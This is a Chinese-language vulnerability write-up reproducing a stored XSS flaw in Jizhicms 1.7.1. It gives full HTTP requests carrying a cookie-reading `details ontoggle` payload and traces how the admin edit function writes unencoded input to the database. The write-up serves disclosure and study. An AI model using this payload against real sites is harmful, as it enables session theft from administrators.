# Jizhicms 1.7.1 存储XSS漏洞

## 一、漏洞简介

## 二、漏洞影响

Jizhicms 1.7.1

## 三、复现过程

首先自己注册一个账户然后登陆，在文章标题处插入XSS payload

```
payload:<details open>

```

![1.png](images/2020_06_13/c15908e44d9349caa20ab3b72f33fb68.png)

管理员登录后台点击编辑且没有修改里面的字符串就保存的话那便会触发XSS漏洞

![2.png](images/2020_06_13/5dd8fac5fe75494b84645e0bee4d4cd6.png)

![3.png](images/2020_06_13/f743adac232840189e1df5d6cf804e39.png)

首先看一下在前台发表文章处的请求数据包

```bash
POST /user/release.html HTTP/1.1
Host: www.baidu.com:8091
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 187
Origin: http://www.baidu.com:8091
Connection: close
Referer: http://www.baidu.com:8091/user/release.html
Cookie: PHPSESSID=t616fln4me32an09rj6v67vr5b

ajax=1&isshow=&molds=article&tid=2&title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&keywords=&litpic=&description=123&body=%3Cp%3E123%3Cbr%2F%3E%3C%2Fp%3E

```

根据url定位到release函数

![4.png](images/2020_06_13/37ff35a2c6084e26b7cc335c22fd6c36.png)

该函数主要是先检查是否是登录状态然后检查是否存在违禁词汇，其中违禁词汇取的是webconf['mingan']的值，由前篇文章可知数据存放在数据库中然后通过缓存读取相关信息，可以直接输出一下

![5.png](images/2020_06_13/b0b264c387e14d7a820afc1ef7d1f503.png)

```
过滤的东西和XSS关系不大，主要是涉及到文章敏感汉字之类的，然后被保存到数据库中的时候<>变成了&lt; &gt;

```

![6.png](images/2020_06_13/0a4e0ebc56b045958c8447d1c977270e.png)

看下是如何进行操作的，继续跟进该函数，通过frparam函数进行操作之后对title进行赋值

![7.png](images/2020_06_13/9933cee4fbd94ee4a74702b1089c138d.png)

frparam函数在获取到相关值后调用format_param函数对数据进行处理，由于传入的int的值为1.所以对传入的参数进行了html实体编码

![8.png](images/2020_06_13/4c39e553a511405e86c9bbd92b48fbe4.png)

![9.png](images/2020_06_13/f0b5118c399242d3844191a05e0b65b2.png)

所以在数据库中存储的是进行过实体编码的xss payload

最后登入后台看下编辑函数

```bash
POST /admin.php/Article/editarticle.html HTTP/1.1
Host: www.baidu.com:8091
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 340
Origin: http://www.baidu.com:8091
Connection: close
Referer: http://www.baidu.com:8091/admin.php/Article/editarticle/id/34.html
Cookie: PHPSESSID=t616fln4me32an09rj6v67vr5b

go=1&id=34&title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&tid=2&seo_title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&hits=0&keywords=&litpic=&file=&description=123&orders=0&tags=&isshow=0&addtime=2020-05-28+17%3A17%3A39&target=&ownurl=&body=%3Cp%3E123%3Cbr%2F%3E%3C%2Fp%3E

```

看一下数据中的更新情况，又将变成了<>,所以触发了XSS漏洞

![10.png](images/2020_06_13/fcc79b752738404fb2b700465d803a6d.png)

定位到漏洞函数editarticle，看到同样调用了frparam函数

![11.png](images/2020_06_13/8fc50427296d43f4b7ef79ed55ca394f.png)

frparam函数由于没有传入参数会直接返回url中的数据

![12.png](images/2020_06_13/3b6eea22dd8a47b096320c25c0faea7d.png)

在请求包中可以看到是已经将html实体化编码变成了原字符，所以data取到的数据时没有经过html编码的数据

![13.png](images/2020_06_13/540a097b13fd4a0f940117a395c2a84f.png)

所以在进行update更新操作的时候就会向数据库写入未经html实体化编码的数据

## 参考链接

> https://xz.aliyun.com/t/7861

